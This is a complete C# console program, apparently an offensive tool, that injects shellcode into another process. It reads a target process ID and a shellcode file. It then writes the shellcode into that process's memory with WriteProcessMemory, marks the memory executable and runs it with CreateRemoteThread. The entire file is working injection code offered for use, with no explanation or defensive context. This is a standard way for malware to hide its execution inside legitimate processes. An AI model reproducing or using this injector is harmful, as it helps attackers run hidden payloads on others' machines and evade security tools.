using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;

namespace AnotherShellcodeInjector
{
    class Program
    {
        static void Main(string[] args)
        {

            Console.WriteLine();
            Console.Write("PID:");
            if (!int.TryParse(Console.ReadLine(), out int processId))
            {
                Console.WriteLine("Invalid PID");
                return;
            }

            try
            {
                Process process = Process.GetProcessById(processId);
                Console.WriteLine($"Selected Process: {process.ProcessName} (PID: {processId})");
            }
            catch (ArgumentException)
            {
                Console.WriteLine($"Process with PID {processId} does not exist");
                return;
            }
            Console.WriteLine();
            Console.Write("Shellcode Path:");
            string shellcodeFilePath = Console.ReadLine();

            if (!File.Exists(shellcodeFilePath))
            {
                Console.WriteLine($"File '{shellcodeFilePath}' does not exist");
                return;
            }

            try
            {
                byte[] shellcodeBuffer = File.ReadAllBytes(shellcodeFilePath);
                Injector.Execute(shellcodeBuffer, processId);
                Console.WriteLine("Successfully injected Shellcode");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error while injecting shellcode: {ex.Message}");
            }
            
        }

        static class Injector
        {
            private const uint PROCESS_VM_WRITE = 0x0020;
            private const uint PROCESS_VM_OPERATION = 0x0008;
            private const uint PROCESS_CREATE_THREAD = 0x0002;
            private const uint MEM_COMMIT = 0x1000;
            private const uint PAGE_READWRITE = 0x04;
            private const uint PAGE_EXECUTE_READ = 0x20;

            [DllImport("kernel32.dll")]
            private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

            [DllImport("kernel32.dll")]
            private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

            [DllImport("kernel32.dll")]
            private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, IntPtr nSize, out uint lpNumberOfBytesWritten);

            [DllImport("kernel32.dll")]
            private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

            [DllImport("kernel32.dll")]
            private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            [DllImport("kernel32.dll")]
            private static extern bool CloseHandle(IntPtr hObject);

            public static void Execute(byte[] shellcode, int processID)
            {
                var hProcess = OpenProcess(
                    PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
                    false,
                    (uint)processID);

                var virtualAlloc = VirtualAllocEx(
                    hProcess,
                    IntPtr.Zero,
                    (uint)shellcode.Length,
                    MEM_COMMIT,
                    PAGE_READWRITE);

                WriteProcessMemory(
                    hProcess,
                    virtualAlloc,
                    shellcode,
                    new IntPtr(shellcode.Length),
                    out _);

                VirtualProtectEx(
                    hProcess,
                    virtualAlloc,
                    (UIntPtr)shellcode.Length,
                    PAGE_EXECUTE_READ,
                    out _);

                CreateRemoteThread(
                    hProcess,
                    IntPtr.Zero,
                    0,
                    virtualAlloc,
                    IntPtr.Zero,
                    0,
                    IntPtr.Zero);

                CloseHandle(hProcess);
            }
        }
    }
}
